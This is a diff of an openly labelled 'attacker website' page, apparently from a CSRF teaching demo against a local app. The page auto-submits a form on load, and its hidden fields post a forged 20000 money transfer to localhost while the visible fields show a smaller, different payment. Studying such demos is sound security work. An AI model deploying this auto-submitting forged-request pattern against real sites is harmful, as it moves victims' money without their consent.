@@ -1,19 +1,25 @@
-<html lang=en>
+<html lang="en">
   <head>
-    <meta charset=utf-8>
-    <title>The Attacker Website</title>
-    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+    <meta charset="utf-8" />
+    <title>😈 The Attacker Website 😈</title>
+    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css" />
   </head>
+  <script>
+    window.onload = function () {
+      document.forms[0].submit();
+    };
+  </script>
   <body>
     <h1>The Attacker Website</h1>
 
     <section>
-      <form method="post" action="http://localhost:3000/user">
-          <input type="hidden" name="username" value="The Attacker">
-          <input type="hidden" name="email" value="theattacker@attacker.com">
+      <form method="post" action="http://localhost:3000/transactions">
+        <input type="text" name="x-name" value="Maria Lindgren" />
+        <input type="text" name="x-amount" value="1000" />
+        <input type="hidden" name="name" value="Payment to 🤑🤑🤑🤑🤑🤑🤑🤑" />
+        <input type="hidden" name="amount" value="20000" />
+        <button type="submit">Transfer money</button>
       </form>
-      <a href="#" onclick="document.forms[0].submit()">Visit this website!</a>
     </section>
-    
   </body>
 </html>
